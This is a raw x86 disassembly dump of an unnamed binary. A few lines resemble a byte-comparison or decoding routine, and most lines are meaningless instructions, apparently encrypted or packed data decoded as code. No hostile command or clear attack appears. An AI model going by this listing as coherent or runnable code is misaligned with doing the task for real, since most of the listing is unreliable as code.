  407af0:	or     DWORD PTR [edx+0x3f],ebx
  407af3:	imul   eax,DWORD PTR [ebx-0x73b46e16],0x79
  407afa:	stos   BYTE PTR es:[edi],al
  407afb:	or     al,0x6
  407afd:	loopne 0x407aad
  407aff:	(bad)  
  407b00:	pop    ss
  407b01:	imul   esi,DWORD PTR [ebx],0xb63a9a83
  407b07:	jmp    0x67fa:0xa3b257ca
  407b0e:	test   DWORD PTR [ebp+0x1b],0x6b25ba59
  407b15:	call   0xb70f:0x8458bc7
  407b1c:	add    al,0x90
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	jmp    0x407b90
  407b4d:	fimul  WORD PTR [edx+0x7d]
  407b50:	lds    edi,FWORD PTR [esi+0x7e]
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407ae6
  407b58:	inc    esp
  407b59:	adc    ecx,DWORD PTR [eax]
  407b5b:	inc    ecx
  407b5c:	into   
  407b5d:	xchg   ch,al
  407b5f:	xor    esi,edx
  407b61:	add    al,0x95
  407b63:	sub    edx,DWORD PTR [ebx]
  407b65:	mov    ds:0x6b35fc1b,eax
  407b6a:	rol    DWORD PTR [edi+ecx*1+0x4a63fb6c],cl
  407b71:	leave  
  407b72:	inc    edx
  407b73:	cs jno 0x407bc5
  407b76:	sbb    al,0x59
  407b78:	sbb    eax,0x34366d01
  407b7d:	push   ebp
  407b7e:	xchg   edi,eax
  407b7f:	mov    edx,0x89dad4d6
  407b84:	cmp    esp,DWORD PTR [edi+0xdc67a3f]
  407b8a:	(bad)  
  407b8b:	ja     0x407bd1
  407b8d:	retf   
  407b8e:	iret   
  407b8f:	cmp    DWORD PTR ds:0xf79a310c,ebx
  407b95:	clc    
  407b96:	inc    edx
  407b97:	add    dl,dl
  407b99:	jg     0x407bde
  407b9b:	ret    
  407b9c:	sub    cl,bl
  407b9e:	scas   eax,DWORD PTR es:[edi]
  407b9f:	aam    0xbe
  407ba1:	callw  0x6be3
  407ba5:	cmp    eax,0x36e86859
  407baa:	repz into 
  407bac:	loop   0x407c2d
  407bae:	push   ds
  407baf:	stos   BYTE PTR es:[edi],al
  407bb0:	xlat   BYTE PTR ds:[ebx]
  407bb1:	mov    esi,0xac90f4a7
  407bb6:	push   ds
  407bb7:	sar    bl,cl
  407bb9:	test   ch,al
  407bbb:	mov    edx,0x9cd87929
  407bc0:	mov    bh,BYTE PTR [bx+si-0x60]
  407bc4:	call   0xd71e:0x957feaef
  407bcb:	pop    ebp
  407bcc:	dec    ebx
  407bcd:	add    BYTE PTR [esi-0x27],cl
  407bd0:	lock scas eax,DWORD PTR es:[edi]
  407bd2:	jne    0x407b65
  407bd4:	into   
  407bd5:	stos   BYTE PTR es:[edi],al
  407bd6:	jmp    0xc62b887a
  407bdb:	xchg   DWORD PTR [ecx-0x38],edi
  407bde:	xor    al,0x7
  407be0:	popf   
  407be1:	iret   
  407be2:	loope  0x407bbd
  407be4:	test   al,0x4e
  407be6:	mov    ds:0x5ab37c93,al
  407beb:	(bad)  
  407bec:	mov    edi,0x1c4b82a8
  407bf1:	stos   DWORD PTR es:[edi],eax
  407bf2:	dec    esi
  407bf3:	popa   
  407bf4:	ja     0x407bd3
  407bf6:	pop    eax
  407bf7:	or     al,0xc
  407bf9:	retf   
  407bfa:	and    BYTE PTR [esi],ah
  407bfc:	jnp    0x407c6e
  407bfe:	enter  0x6f8c,0xc
  407c02:	repz mov al,ds:0xb092d79d
  407c08:	xchg   BYTE PTR [ecx+0xf8ff54b],ah
  407c0e:	push   edi
  407c0f:	and    DWORD PTR [edx+0x44810f7e],edi
  407c15:	push   ss
  407c16:	or     eax,0x4cfa959e
  407c1b:	les    ebx,FWORD PTR [ecx]
  407c1d:	push   eax
  407c1e:	retf   0xe070
  407c21:	mov    DWORD PTR [ecx],esi
  407c23:	add    eax,0x30dc7394
  407c28:	test   eax,0xb21d5ec4
  407c2d:	cmp    DWORD PTR [ebx],ecx
  407c2f:	mov    edx,0x56171a10
  407c34:	sbb    BYTE PTR [ebx],dh
  407c36:	jge    0x407ca1
  407c38:	es je  0x407bc1
  407c3b:	sub    eax,0xda2a22e1
  407c40:	stos   BYTE PTR es:[edi],al
  407c41:	or     ebp,DWORD PTR ds:0x579d61db
  407c47:	fmul   st,st(6)
  407c49:	xor    esi,0xa7c9b9e2
  407c4f:	cmp    dh,dl
  407c51:	sar    BYTE PTR [edx-0xb7e93f0],1
  407c57:	pop    eax
  407c58:	jl     0x407ca9
  407c5a:	js     0x407c0c
  407c5c:	mov    eax,0x73d50c1e
  407c61:	mov    cs,WORD PTR [ebx-0x52ad8d6d]
  407c67:	mov    dh,0xe8
  407c69:	cs push ebp
  407c6b:	daa    
  407c6c:	xchg   BYTE PTR [edx],al
  407c6e:	retf   
  407c6f:	mov    WORD PTR [esp+eiz*8],gs
  407c72:	sub    BYTE PTR [edi+0x2b421f2b],dh
  407c78:	test   BYTE PTR [ebx],bh
  407c7a:	into   
  407c7b:	loopne 0x407cbf
  407c7d:	fdivr  QWORD PTR [edx]
  407c7f:	push   0x14523f1e
  407c84:	aam    0x9b
  407c86:	xchg   ecx,eax
  407c87:	jnp    0x407c51
  407c89:	pushf  
  407c8a:	mov    al,dh
  407c8c:	dec    esi
  407c8d:	push   ecx
  407c8e:	push   0xf695b025
  407c93:	loope  0x407ce5
  407c95:	mov    WORD PTR [edi+0x50],cs
  407c98:	or     ah,BYTE PTR [ecx-0x3d68a2cf]
  407c9e:	push   edx
  407c9f:	cmp    bh,dh
  407ca1:	adc    ebp,edx
  407ca3:	and    BYTE PTR [esi+edi*1+0x79],bh
  407ca7:	dec    esp
  407ca8:	adc    DWORD PTR ds:0x47b17731,ebx
  407cae:	mov    esi,DWORD PTR ds:0x5956185c
  407cb4:	in     al,0xae
  407cb6:	rol    BYTE PTR [esi],0xcb
  407cb9:	sub    ah,BYTE PTR [esi-0x75]
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	imul   edx,eax,0xffffffc6
  407ce2:	inc    edx
  407ce3:	rol    edi,1
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407ce5
  407cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ced:	ss stos DWORD PTR es:[edi],eax
  407cef:	mov    bl,0xc2
  407cf1:	in     eax,0x1d
  407cf3:	je     0x407c8b
  407cf5:	lock add eax,0x691c035b
  407cfb:	sbb    ebp,DWORD PTR [esi+0x524b416f]
  407d01:	sbb    DWORD PTR [edx+0x686acbae],ecx
  407d07:	cmp    ax,0x8549
  407d0b:	daa    
  407d0c:	sti    
  407d0d:	scas   al,BYTE PTR es:[edi]
  407d0e:	dec    esi
  407d0f:	cmc    
  407d10:	stc    
  407d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d12:	test   DWORD PTR cs:[ecx+0x63],ebp
  407d16:	sbb    DWORD PTR [ebx+0x2c828e21],0xffffffec
  407d1d:	sub    esp,DWORD PTR [edx-0x41]
  407d20:	cli    
  407d21:	jmp    0x46b3:0x141447eb
  407d28:	or     bh,BYTE PTR [ecx+0x411246e7]
  407d2e:	in     eax,dx
  407d2f:	inc    bh
  407d31:	push   ss
  407d32:	out    0x17,al
  407d34:	in     eax,dx
  407d35:	add    DWORD PTR [esi],edx
  407d37:	retf   
  407d38:	lods   eax,DWORD PTR ds:[esi]
  407d39:	(bad)  
  407d3a:	jmp    0x407d6a
  407d3c:	retf   
  407d3d:	and    al,0x6d
  407d3f:	add    eax,0xc81b1f56
  407d44:	popf   
  407d45:	call   0x39f58dcb
  407d4a:	ins    DWORD PTR es:[edi],dx
  407d4b:	jp     0x407d76
  407d4d:	xchg   esp,eax
  407d4e:	inc    esp
  407d4f:	jo     0x407cf0
  407d51:	sbb    eax,0x180fab80
  407d56:	mul    DWORD PTR [ecx]
  407d58:	in     al,0xdb
  407d5a:	xor    edi,DWORD PTR [ebx+0x644cb5a9]
  407d60:	inc    eax
  407d61:	addr16 dec esp
  407d63:	cmp    dh,BYTE PTR [esi+ebx*8-0x5f349642]
  407d6a:	cmp    cl,bh
  407d6c:	fiadd  DWORD PTR [ecx]
  407d6e:	sub    BYTE PTR [esi+0x106d4c63],dh
  407d74:	and    edi,esp
  407d76:	lea    edi,[edi]
  407d78:	ins    DWORD PTR es:[edi],dx
  407d79:	add    bh,0x76
  407d7c:	(bad)  
  407d7d:	add    eax,0xe4cd3052
  407d82:	or     DWORD PTR ds:0x168707a9,ebp
  407d88:	mov    ds:0x8c8095f0,eax
  407d8d:	fwait
  407d8e:	pop    esi
  407d8f:	xchg   DWORD PTR [ebp+0x2fcec8f5],edi
  407d95:	dec    edi
  407d96:	fwait
  407d97:	jnp    0x407d4a
  407d99:	pop    ss
  407d9a:	or     BYTE PTR [edi+0x4bae59db],0xc4
  407da1:	mov    cl,0x62
  407da3:	cmp    DWORD PTR [esi],0xda4486d8
  407da9:	and    eax,0x2c9e0977
  407dae:	stc    
  407daf:	inc    edi
  407db0:	cmp    edi,DWORD PTR [eax+0x59]
  407db3:	sub    eax,0xaf448585
  407db8:	iret   
  407db9:	xchg   DWORD PTR [eax],ebp
  407dbb:	loopne 0x407d59
  407dbd:	fmul   DWORD PTR fs:[ecx]
  407dc0:	jmp    DWORD PTR [edi-0x64]
  407dc3:	jp     0x407d56
  407dc5:	mov    ebp,0xaf7b1978
  407dca:	sbb    al,BYTE PTR [ebp-0x1c]
  407dcd:	cmp    eax,0x5905b775
  407dd2:	loopne 0x407dfb
  407dd4:	sbb    eax,0xa1e139db
  407dd9:	repz int3 
  407ddb:	hlt    
  407ddc:	(bad)  
  407ddd:	(bad)  
  407dde:	fist   DWORD PTR [esi+eax*4-0x573342e9]
  407de5:	mov    esp,0x311cd641
  407dea:	into   
  407deb:	jp     0x407e08
  407ded:	(bad)  
  407dee:	rol    BYTE PTR [esp+eax*4],cl
  407df1:	loop   0x407dad
  407df3:	mov    edi,0x1d70660f
  407df8:	leave  
  407df9:	paddsb mm5,mm4
  407dfc:	dec    edi
  407dfd:	mov    bh,bl
  407dff:	test   eax,0xfab90550
  407e04:	imul   ebx,DWORD PTR [edi+0x10],0x22
  407e08:	dec    eax
  407e09:	enter  0xdf90,0x9
  407e0d:	add    dl,ah
  407e0f:	(bad)  
  407e10:	into   
  407e11:	push   edi
  407e12:	out    dx,eax
  407e13:	stc    
  407e14:	mov    WORD PTR [edx+eax*2-0x366d902e],?
  407e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e1c:	rol    BYTE PTR [ebx],cl
  407e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e1f:	xor    eax,0x7516d347
  407e24:	loope  0x407e7e
  407e26:	cli    
  407e27:	ffree  st(3)
  407e29:	push   0x26749eed
  407e2e:	adc    BYTE PTR [edi+0x7071cf20],ah
  407e34:	lock jnp 0x407dcc
  407e37:	(bad)  
  407e38:	fnstenv [esi+0x61]
  407e3b:	call   0x1ce4907b
  407e40:	cmp    DWORD PTR [edi],0xffffff9b
  407e43:	inc    edi
  407e44:	xor    DWORD PTR [ebp+0x429883a6],edx
  407e4a:	rol    cl,cl
  407e4c:	jb     0x407e6f
  407e4e:	adc    cl,BYTE PTR [ecx+0x458b0845]
  407e54:	or     BYTE PTR [edx-0x7557fabc],cl
  407e5a:	push   ebp
  407e5b:	(bad)  
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x81
  407ea7:	sbb    eax,0xd8b5c364
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e83
  407eb3:	clc    
  407eb4:	cwde   
  407eb5:	cwde   
  407eb6:	sub    al,0x32
  407eb8:	out    0x1,al
  407eba:	in     al,0x8
  407ebc:	dec    ebp
  407ebd:	scas   al,BYTE PTR es:[edi]
  407ebe:	pop    ebx
  407ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec0:	lea    esp,[ebp+0x7c]
  407ec3:	inc    esp
  407ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec5:	fstp   DWORD PTR [ebx-0x24]
  407ec8:	and    eax,0x50be1179
  407ecd:	in     eax,dx
  407ece:	cmp    cl,BYTE PTR [eax+0x57252684]
  407ed4:	pusha  
  407ed5:	cmp    ah,BYTE PTR [edx-0x3e]
  407ed8:	out    dx,al
  407ed9:	mov    ch,BYTE PTR [ecx-0x78]
  407edc:	mov    ebx,0x72bc0448
  407ee1:	(bad)  
  407ee2:	mov    edx,0xf29b81fe
  407ee7:	dec    ecx
  407ee8:	in     al,0x75
  407eea:	push   ds
  407eeb:	int3   
  407eec:	mov    esp,0xee2b8463
  407ef1:	or     DWORD PTR [edx+0x5d29b330],edi
  407ef7:	jo     0x407ea0
  407ef9:	jp     0x407e85
  407efb:	inc    eax
  407efc:	in     eax,dx
  407efd:	je     0x407f20
  407eff:	out    0x17,eax
  407f01:	loope  0x407e8a
  407f03:	imul   edx,DWORD PTR [ecx-0x24],0x17
  407f07:	jmp    0x4240:0xdf0c9a39
  407f0e:	push   esi
  407f0f:	(bad)
  407f12:	or     edx,DWORD PTR ss:[ecx+0x451420c9]
  407f19:	(bad)  
  407f1a:	xlat   BYTE PTR ds:[ebx]
  407f1b:	push   es
  407f1c:	ds in  al,0x18
  407f1f:	dec    ebx
  407f20:	clc    
  407f21:	stos   BYTE PTR es:[edi],al
  407f22:	cli    
  407f23:	adc    eax,eax
  407f25:	test   eax,0xf53b69f6
  407f2a:	cmp    cl,BYTE PTR [ebp+0x3c]
  407f2d:	mov    ebx,0x13724617
  407f32:	imul   edi,DWORD PTR [ecx+eiz*1],0xffffffd7
  407f36:	fcom   QWORD PTR [esi+0xa]
  407f39:	cmp    DWORD PTR [ebp+0x53],ecx
  407f3c:	adc    DWORD PTR [eax-0x783f639d],esi
  407f42:	jg     0x407f18
  407f44:	cdq    
  407f45:	jnp    0x407f9c
  407f47:	xlat   BYTE PTR ds:[ebx]
  407f48:	int3   
  407f49:	push   edx
  407f4a:	dec    esp
  407f4b:	or     al,0x4b
  407f4d:	mov    DWORD PTR [eax+0x486e4fc4],ebp
  407f53:	pop    es
  407f54:	icebp  
  407f55:	mov    eax,ds:0xac445566
  407f5a:	rcr    BYTE PTR [ebp+0x9],0x81
  407f5e:	pop    esi
  407f5f:	movsx  ecx,al
  407f62:	jecxz  0x407f15
  407f64:	jne    0x407fb1
  407f66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f67:	cdq    
  407f68:	pushf  
  407f69:	add    al,0xde
  407f6b:	mov    edi,0xde0d8818
  407f70:	sub    al,0x2f
  407f72:	jle    0x407f3c
  407f74:	sbb    bl,BYTE PTR [edx]
  407f76:	sti    
  407f77:	mov    al,ds:0x7de2fcdb
  407f7c:	inc    edi
  407f7d:	fidivr DWORD PTR [edx]
  407f7f:	xchg   ebx,eax
  407f80:	fcmovne st,st(0)
  407f82:	add    eax,DWORD PTR [ecx]
  407f84:	and    DWORD PTR [edi],ebx
  407f86:	mov    ds:0x39698ed1,eax
  407f8b:	pop    ss
  407f8c:	iret   
  407f8d:	sub    DWORD PTR [ebx+0x326fa92],esp
  407f93:	test   DWORD PTR [esi+0x5d],esp
  407f96:	pop    edx
  407f97:	cli    
  407f98:	xchg   esi,esp
  407f9a:	dec    edx
  407f9b:	lods   al,BYTE PTR ds:[esi]
  407f9c:	push   ss
  407f9d:	and    al,al
  407f9f:	cdq    
  407fa0:	loopne 0x407fa7
  407fa2:	cmc    
  407fa3:	add    edi,edi
  407fa5:	mov    eax,ds:0xbf35748e
  407faa:	or     bh,BYTE PTR [edi]
  407fac:	sar    DWORD PTR [edi+0x4e],0xc5
  407fb0:	arpl   WORD PTR [ecx-0x7c],bp
  407fb3:	xchg   esp,eax
  407fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fb5:	int    0x73
  407fb7:	(bad)  
  407fb8:	stc    
  407fb9:	fistp  QWORD PTR [ebx+ebp*4-0x4f]
  407fbd:	hlt    
  407fbe:	and    edx,DWORD PTR [edx+0xfbf0364]
  407fc4:	fwait
  407fc5:	shl    BYTE PTR ds:0xdae77e37,1
  407fcb:	dec    esp
  407fcc:	sub    BYTE PTR [edi],0xdf
  407fcf:	push   ecx
  407fd0:	mov    es,WORD PTR [ecx+0x28e4af71]
  407fd6:	jns    0x408020
  407fd8:	(bad)  
  407fd9:	adc    DWORD PTR [edi+0x6a],edi
  407fdc:	cmp    al,0xd8
  407fde:	sbb    ebx,DWORD PTR ds:0x697183f9
  407fe4:	into   
  407fe5:	repz push eax
  407fe7:	pop    ebx
  407fe8:	pop    ebp
  407fe9:	or     BYTE PTR [edx+0x43d233e4],ch
  407fef:	fnstcw WORD PTR [eax+0x6c5fcb5]
  407ff5:	jp     0x407fd0
  407ff7:	dec    edi
  407ff8:	jo     0x408071
  407ffa:	dec    esi
  407ffb:	mov    dh,BYTE PTR [ebp+0x4517c0c4]
  408001:	ret    
  408002:	push   ecx
  408003:	pop    ds
  408004:	ret    
  408005:	fwait
  408006:	dec    ecx
  408007:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408008:	ret    0xd4df
  40800b:	inc    ecx
  40800c:	and    eax,0x9c3d10dc
  408011:	ds sbb edx,ebx
  408014:	popf   
  408015:	jo     0x407fa0
  408017:	inc    ebp
  408018:	in     al,dx
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x2d1d0ee],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x4080a2
  408040:	xchg   DWORD PTR [edx],ebx
  408042:	bound  esi,QWORD PTR [ebx+0x60]
  408045:	and    al,BYTE PTR [edx-0x10]
  408048:	clc    
  408049:	outs   dx,BYTE PTR ds:[esi]
  40804a:	mov    edx,0x8e721969
  40804f:	cli    
  408050:	imul   DWORD PTR [ebp+0x7b6b366d]
  408056:	mov    dh,0x2
  408058:	outs   dx,DWORD PTR ds:[esi]
  408059:	sbb    al,0xc
  40805b:	retf   0x54b7
  40805e:	mov    ds,WORD PTR [esi]
  408060:	mov    al,ds:0x5674024
  408065:	arpl   cx,cx
  408067:	ret    
  408068:	mov    al,ds:0x81bd9b8e
  40806d:	test   BYTE PTR [ebp-0x58],ch
  408070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408071:	dec    DWORD PTR [esi+0x6821e580]
  408077:	sahf   
  408078:	es adc bl,bh
  40807b:	dec    ecx
  40807c:	pop    ds
  40807d:	mov    esp,0x34f89a3e
  408082:	xor    DWORD PTR [ecx+0x50749bb2],edx
  408088:	call   0x3b70:0x4a2717d3
  40808f:	push   0xee745ee7
  408094:	fistp  DWORD PTR [esi+0x43fc93d6]
  40809a:	loop   0x408119
  40809c:	(bad)  
  40809d:	mov    al,ds:0xcf5f29ec
  4080a2:	mov    esp,0xfbda1b9b
  4080a7:	cmp    dl,0xe8
  4080aa:	std    
  4080ab:	cmp    dl,ch
  4080ad:	rol    ecx,cl
  4080af:	adc    esi,0xffffff8c
  4080b2:	xchg   edx,eax
  4080b3:	loop   0x408105
  4080b5:	mov    ebx,0xcc23ce63
  4080ba:	xchg   esp,eax
  4080bb:	popa   
  4080bc:	ds icebp 
  4080be:	xlat   BYTE PTR ds:[ebx]
  4080bf:	xor    DWORD PTR [esi-0xb],ebx
  4080c2:	clc    
  4080c3:	inc    ebx
  4080c4:	in     eax,dx
  4080c5:	and    eax,0x499e9c4c
  4080ca:	ret    0xa73c
  4080cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ce:	push   cs
  4080cf:	sbb    al,0xa3
  4080d1:	mov    ch,ch
  4080d3:	push   ss
  4080d4:	jb     0x40814d
  4080d6:	loop   0x4080d1
  4080d8:	or     eax,0xff17c225
  4080dd:	icebp  
  4080de:	into   
  4080df:	daa    
  4080e0:	inc    esi
  4080e1:	(bad)  
  4080e2:	cmovo  ecx,DWORD PTR [esi+0x4b]
  4080e6:	mov    bl,0x72
  4080e8:	out    0x32,al
  4080ea:	mov    ebp,0x88b72643
  4080ef:	add    al,BYTE PTR [eax+0x2]
  4080f2:	push   0xffffffd2
  4080f4:	cmp    eax,0xaa087271
  4080f9:	or     BYTE PTR [ebx],cl
  4080fb:	sbb    BYTE PTR [esp+esi*2],dl
  4080fe:	out    0x8b,al
  408100:	rcr    DWORD PTR [edi],cl
  408102:	mov    al,BYTE PTR [ecx+0x4115d168]
  408108:	jle    0x408115
  40810a:	(bad)  
  40810b:	aaa    
  40810c:	fst    st(5)
  40810e:	neg    BYTE PTR [edx]
  408110:	iret   
  408111:	arpl   ax,ax
  408113:	push   0xd2229794
  408118:	lea    ebp,[ecx]
  40811a:	fdiv   QWORD PTR [edx+0x72]
  40811d:	inc    esi
  40811e:	or     DWORD PTR [eax-0x9],edx
  408121:	shl    DWORD PTR [edi],0x8f
  408124:	and    eax,0x398c4e46
  408129:	neg    BYTE PTR [esi-0x33]
  40812c:	mov    WORD PTR [ebx-0x43e348c],cs
  408132:	ja     0x408121
  408134:	sub    cl,ah
  408136:	xchg   ebp,eax
  408137:	sub    eax,0xa1fb0f3d
  40813c:	adc    ch,BYTE PTR [ebp+0x23]
  40813f:	ret    
  408140:	rcl    DWORD PTR [esi],1
  408142:	or     eax,DWORD PTR [edi-0x2d49790d]
  408148:	dec    edi
  408149:	dec    ecx
  40814a:	inc    BYTE PTR [edi+0x3d8a28b2]
  408150:	sub    BYTE PTR [edi+0x2f60a998],ch
  408156:	sub    bh,BYTE PTR [ecx]
  408158:	jecxz  0x40819b
  40815a:	in     eax,0x14
  40815c:	fisttp QWORD PTR [ebx-0x6]
  40815f:	test   al,0x99
  408161:	scas   eax,DWORD PTR es:[edi]
  408162:	mul    DWORD PTR [ecx-0x80]
  408165:	jno    0x4080f8
  408167:	pop    esp
  408168:	pop    edi
  408169:	ds (bad) 
  40816b:	aad    0xd0
  40816d:	mov    edi,0x736132cd
  408172:	mov    bl,0x6f
  408174:	mov    ebx,0x6479cfdd
  408179:	lods   eax,DWORD PTR ds:[esi]
  40817a:	add    eax,edi
  40817c:	cld    
  40817d:	loope  0x4081bf
  40817f:	cmp    dl,BYTE PTR [ebp+0x19]
  408182:	cmp    cl,dl
  408184:	bound  eax,QWORD PTR [ecx+0x33]
  408187:	repz into 
  408189:	fnsave [edx+0x2a817fdc]
  40818f:	mov    edx,0xf2ddae7d
  408194:	dec    edi
  408195:	and    DWORD PTR [ebp-0x51],esi
  408198:	push   ebp
  408199:	gs dec esi
  40819b:	aaa    
  40819c:	mov    al,ds:0x1ddd645f
  4081a1:	pop    ebx
  4081a2:	xor    DWORD PTR [ebx+0x558bf045],ecx
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0xd1f6e71]
  4081bf:	sub    eax,0x7e7edb8d
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x4081c2
  4081c9:	jmp    0x40822a
  4081cb:	shr    dl,cl
  4081cd:	dec    esi
  4081ce:	and    DWORD PTR [ebx+0x5f6c0f73],0xffffffd7
  4081d5:	loope  0x4081ef
  4081d7:	mov    dl,bl
  4081d9:	pop    esi
  4081da:	mov    BYTE PTR [esi+0x61],ch
  4081dd:	cmp    ecx,DWORD PTR [ecx]
  4081df:	xchg   BYTE PTR [ebx-0xea6fb46],al
  4081e5:	fwait
  4081e6:	stos   DWORD PTR es:[edi],eax
  4081e7:	push   edi
  4081e8:	inc    edx
  4081e9:	xchg   ebx,eax
  4081ea:	mov    ds:0x76a70056,eax
  4081ef:	push   ebp
  4081f0:	test   DWORD PTR [ecx],edi
  4081f2:	cmp    cl,BYTE PTR [ebp-0x69]
  4081f5:	stos   DWORD PTR es:[edi],eax
  4081f6:	jno    0x40822f
  4081f8:	sub    eax,0x19cbcf5a
  4081fd:	xchg   edx,eax
  4081fe:	ins    BYTE PTR es:[edi],dx
  4081ff:	adc    ch,BYTE PTR [esi]
  408201:	or     eax,0xa50f84a6
  408206:	and    dl,bh
  408208:	jbe    0x40821a
  40820a:	ins    BYTE PTR es:[edi],dx
  40820b:	pop    ecx
  40820c:	xor    eax,0x5d80920b
  408211:	push   ebp
  408212:	or     ebx,ecx
  408214:	mov    bl,0x88
  408216:	out    0x45,eax
  408218:	mov    ds:0xe1e93b0,al
  40821d:	loope  0x408284
  40821f:	pop    esi
  408220:	cli    
  408221:	mov    BYTE PTR [edi-0x7],dl
  408224:	mov    edx,0x881f5b78
  408229:	mov    dl,0x9
  40822b:	jecxz  0x408292
  40822d:	dec    esi
  40822e:	mov    ah,0x8a
  408230:	mov    al,0xef
  408232:	out    0x4c,al
  408234:	mov    ds:0x39fbca88,eax
  408239:	push   eax
  40823a:	add    dh,cl
  40823c:	dec    ebp
  40823d:	dec    esp
  40823e:	push   DWORD PTR [ecx]
  408240:	ret    0x7d99
  408243:	(bad)  
  408244:	loopne 0x408236
  408246:	pop    ss
  408247:	lock push eax
  408249:	jnp    0x4082a9
  40824b:	cmp    bl,BYTE PTR [edx]
  40824d:	ror    BYTE PTR [ebx+0x29],cl
  408250:	mov    eax,0x63d52bf6
  408255:	xchg   ebx,eax
  408256:	cmp    al,0x37
  408258:	stc    
  408259:	rol    DWORD PTR [esi],cl
  40825b:	jne    0x408217
  40825d:	into   
  40825e:	repz out dx,eax
  408260:	cmp    BYTE PTR [edi-0xde420e8],al
  408266:	loopne 0x4082b4
  408268:	push   ebp
  408269:	push   ss
  40826a:	pop    ds
  40826b:	lahf   
  40826c:	bound  ebp,QWORD PTR [edx+0xdb0d5d]
  408272:	push   esp
  408273:	ins    DWORD PTR es:[edi],dx
  408274:	nop
  408275:	cmp    ah,cl
  408277:	mov    dl,0xa3
  408279:	cmc    
  40827a:	cmp    DWORD PTR [edx],edx
  40827c:	dec    ebp
  40827d:	pop    esp
  40827e:	or     al,0xd5
  408280:	scas   al,BYTE PTR es:[edi]
  408281:	scas   eax,DWORD PTR es:[edi]
  408282:	fist   DWORD PTR [edx]
  408284:	push   ss
  408285:	and    BYTE PTR [edx],dh
  408287:	js     0x408226
  408289:	sub    al,cl
  40828b:	mov    dl,0x94
  40828d:	inc    ecx
  40828e:	or     dh,BYTE PTR [ecx]
  408290:	loop   0x40824c
  408292:	add    al,0x5
  408294:	pop    ebp
  408295:	test   al,0x9b
  408297:	jns    0x4082f7
  408299:	outs   dx,DWORD PTR ds:[esi]
  40829a:	or     eax,ebp
  40829c:	or     bh,ch
  40829e:	lock in al,0x86
  4082a1:	lods   eax,DWORD PTR ds:[esi]
  4082a2:	cmp    al,0xf1
  4082a4:	and    edi,DWORD PTR [ebx+0x50]
  4082a7:	sub    BYTE PTR [edi+esi*4],dl
  4082aa:	xlat   BYTE PTR ds:[ebx]
  4082ab:	sbb    esp,esp
  4082ad:	and    dh,al
  4082af:	mov    ecx,0xe2f7138f
  4082b4:	push   edx
  4082b5:	jmp    0xc641b3af
  4082ba:	or     bl,al
  4082bc:	ds jl  0x40825c
  4082bf:	jl     0x4082cd
  4082c1:	pop    DWORD PTR [eax+0x54abfd5]
